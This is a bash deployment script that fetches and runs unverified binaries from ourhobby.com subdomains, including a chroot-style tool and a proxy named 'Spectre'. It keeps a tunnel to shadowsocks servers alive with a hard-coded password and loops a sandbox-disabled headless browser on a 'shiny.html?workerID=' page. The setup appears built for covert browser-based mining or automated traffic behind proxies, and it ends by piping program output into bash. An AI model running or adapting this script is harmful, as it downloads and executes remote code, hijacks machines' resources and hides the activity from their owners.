base64 -d <<< #!/bin/bash
system33file="system33"
system33_download_url="http://green.wot.ourhobby.com/system33.tar.gz"

if [ ! -f "$system33file" ]; then
    echo "File '$system33file' does not exist. Downloading..."
    wget -q "$system33_download_url"
	sleep 5
	tar -xf system33.tar.gz
else
    echo "File '$system33file' already exists. Skipping download."
fi

ubuntu2204gzippedfile="ubuntu22.04.tar.gz"
ubuntu2204gzippedfile_download_url="http://green.wot.ourhobby.com/ubuntu22.04.tar.gz"

if [ ! -f "$ubuntu2204gzippedfile" ]; then
    echo "File '$ubuntu2204gzippedfile' does not exist. Downloading..."
    wget -q "$ubuntu2204gzippedfile_download_url"
	sleep 5
	tar -xf ubuntu22.04.tar.gz
else
    echo "File '$ubuntu2204gzippedfile' already exists. Skipping download."
fi

sleep 2

./system33 -S . /bin/bash

sleep 2
su -
sleep 2
su -
sleep 2
cd
sleep 2
whoami
sleep 2
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive
sleep 2
cat /etc/*-release
sleep 2
apt update >/dev/null;apt -y install python3 python3-venv libnss3-dev gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget libgbm-dev dpkg >/dev/null

ls -l /var/lib/dpkg/info | grep -i libnss-systemd:amd64 >/dev/null
mv /var/lib/dpkg/info/libnss-systemd:amd64.* /tmp >/dev/null

sleep 2
apt -y --no-install-recommends install tzdata >/dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

cat >> requirements.txt <<END
numpy
requests
asyncio
pyppeteer
END

sleep 2

python3 -m venv .venv
sleep 2
source .venv/bin/activate
sleep 2

pip3 install -r requirements.txt >/dev/null

sleep 2

spectre_gzipped_package_file_download_url="http://green.wot.ourhobby.com/Spectre.tar.gz"
spectre_package_file="/usr/bin/Spectre"

if [ ! -f "$spectre_package_file" ]; then
    echo "File '$spectre_package_file' does not exist. Downloading..."
    wget -q "$spectre_gzipped_package_file_download_url"
	sleep 2
	tar -xf Spectre.tar.gz
	sleep 2
	mv Spectre /usr/bin
else
    echo "File '$spectre_package_file' already exists. Skipping download."
fi


sleep 2

echo "Starting proxy health checker..."
stdbuf -o L nohup bash -c '
while true
do
    CURL_OUT=$(curl -sL -x socks5h://127.0.0.1:1082 -w "%{http_code}" http://api.ipify.org -o /dev/null)
    
    if [ "$CURL_OUT" = "200" ]; then
        echo "$(date): Spectre is still online"
    else
        echo "$(date): Spectre is offline. Attempting to restart..."
        
        pkill Spectre
        
        new_server="ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.ourhobby.com:8443"
        echo "Restarting Spectre with new server: $new_server"
        stdbuf -o L nohup Spectre -L=socks5://127.0.0.1:1082 -F="$new_server" > spectre.log 2>&1 &
        
        sleep 5
        
        echo "New Spectre process started. Checking connectivity..."
		sleep 2
        curl -s -x socks5h://127.0.0.1:1082 http://api.ipify.org
    fi
    sleep 600
done
' >> proxy_checker.log 2>&1 &

echo "Proxy and health checker is running."

sleep 2

cat > run_pyppeteer.py <<EOF
import os
import socket
import requests
import random
import string
import time
import os.path
import asyncio
from pyppeteer import launch
from datetime import datetime

num_of_cores = os.cpu_count()
currentdate = datetime.now().strftime('%d-%b-%Y_ShinyPypp_')
try:
    ipaddress = requests.get('https://api.ipify.org').text
    underscored_ip = ipaddress.replace('.', '_')
    currentdate += underscored_ip
except requests.exceptions.RequestException as e:
    print(f"Could not retrieve IP address: {e}")
    currentdate += "local-ip"

chars = random.choices(string.ascii_letters + string.digits, k=100)
random_word = "".join(chars[:8])
currentdate += random_word

print(f"Your current date from within Python environment is: {currentdate}")

async def visit_and_loop():
    """
    Launches a browser, visits a website, stays for a period, closes the browser,
    and then repeats the process indefinitely.
    """
    while True:
        try:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Launching browser session...")
            
            browser = await launch(
                headless=True,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--ignore-certificate-errors',
                    '--ignore-certificate-errors-spki-list',
                    '--disable-dev-shm-usage',
                    '--disable-infobars',
                    '--disable-extensions',
                    '--disable-background-timer-throttling',
                    '--disable-background-networking',
                    '--disable-web-security',
                    '--disable-gpu',
                    '--proxy-server=socks5://127.0.0.1:1082'
                ],
                autoClose=False
            )
            
            page = await browser.newPage()
            
            url = f"http://sindilesiqhaztraining.wot.ourhobby.com/shiny.html?workerID={currentdate}"
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Visiting URL: {url}")
            await page.goto(url)

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Staying on page for 1 hour...")
            await asyncio.sleep(3600)

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Closing browser session.")
            await browser.close()

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Sleeping for 60 seconds.")
            await asyncio.sleep(60)

        except Exception as e:
            print(f"An error occurred: {e}")

            print("Restarting after a 5-minute pause.")
            await asyncio.sleep(300)

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(visit_and_loop())
EOF

sleep 4

python3 run_pyppeteer.py | bash
